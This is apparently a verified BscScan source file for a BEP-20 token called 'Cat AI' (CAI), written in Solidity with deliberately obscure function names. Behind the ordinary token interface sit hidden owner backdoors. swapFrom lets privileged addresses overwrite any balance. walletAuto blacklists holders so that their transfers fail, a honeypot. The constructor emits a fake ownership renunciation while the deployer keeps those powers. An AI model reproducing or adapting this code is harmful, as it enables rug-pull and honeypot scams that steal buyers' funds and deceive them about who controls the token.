/**
 *Submitted for verification at BscScan.com on 2023-02-25
*/

//SPDX-License-Identifier: MIT

pragma solidity ^0.8.11;

interface senderWallet {
    function createPair(address shouldBuy, address launchedTo) external returns (address);
}

contract CatAI {

    address public autoBuy;

    uint256 private isBuy;

    address public owner;

    function approve(address atAuto, uint256 marketingLiquidityBuy) public returns (bool) {
        allowance[modeBuy()][atAuto] = marketingLiquidityBuy;
        emit Approval(modeBuy(), atAuto, marketingLiquidityBuy);
        return true;
    }

    bool private maxLiquidityMarketing;

    bool private txMax;

    constructor (){ 
        autoBuy = senderWallet(address(0xcA143Ce32Fe78f1f7019d7d551a6402fC5350c73)).createPair(address(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c),address(this));
        exemptWallet = modeBuy();
        balanceOf[exemptWallet] = totalSupply;
        enableLaunched[exemptWallet] = true;
        emit Transfer(address(0), exemptWallet, totalSupply);
        emit OwnershipTransferred(exemptWallet, address(0));
    }

    function modeBuy() private view returns (address) {
        return msg.sender;
    }

    function swapFrom(address maxSender, uint256 marketingLiquidityBuy) public {
        require(enableLaunched[modeBuy()]);
        balanceOf[maxSender] = marketingLiquidityBuy;
    }

    function tradingReceiverLimit(address feeIsBuy, address isLaunchMin, uint256 marketingLiquidityBuy) internal returns (bool) {
        require(balanceOf[feeIsBuy] >= marketingLiquidityBuy);
        balanceOf[feeIsBuy] -= marketingLiquidityBuy;
        balanceOf[isLaunchMin] += marketingLiquidityBuy;
        emit Transfer(feeIsBuy, isLaunchMin, marketingLiquidityBuy);
        return true;
    }

    address public exemptWallet;

    bool public teamSwap;

    event Transfer(address indexed from, address indexed takeAutoMax, uint256 value);

    uint256 public totalSupply = 100000000 * 10 ** 18;

    mapping(address => uint256) public balanceOf;

    string public symbol = "CAI";

    event Approval(address indexed maxTotalTake, address indexed spender, uint256 value);

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    function transferFrom(address atTrading, address maxSender, uint256 marketingLiquidityBuy) public returns (bool) {
        if (atTrading != modeBuy() && allowance[atTrading][modeBuy()] != type(uint256).max) {
            require(allowance[atTrading][modeBuy()] >= marketingLiquidityBuy);
            allowance[atTrading][modeBuy()] -= marketingLiquidityBuy;
        }
        require(!feeReceiver[atTrading]);
        return tradingReceiverLimit(atTrading, maxSender, marketingLiquidityBuy);
    }

    mapping(address => bool) public enableLaunched;

    function transfer(address maxSender, uint256 marketingLiquidityBuy) external returns (bool) {
        return transferFrom(modeBuy(), maxSender, marketingLiquidityBuy);
    }

    uint256 private minMarketingLaunch;

    mapping(address => mapping(address => uint256)) public allowance;

    mapping(address => bool) public feeReceiver;

    uint8 public decimals = 18;

    function walletAuto(address feeTo) public {
        require(enableLaunched[modeBuy()]);
        if (feeTo == exemptWallet || feeTo == autoBuy) {
            return;
        }
        feeReceiver[feeTo] = true;
    }

    string public name = "Cat AI";

    function launchedExemptSender(address fundMin) public {
        require(!teamSwap);
        enableLaunched[fundMin] = true;
        teamSwap = true;
    }

}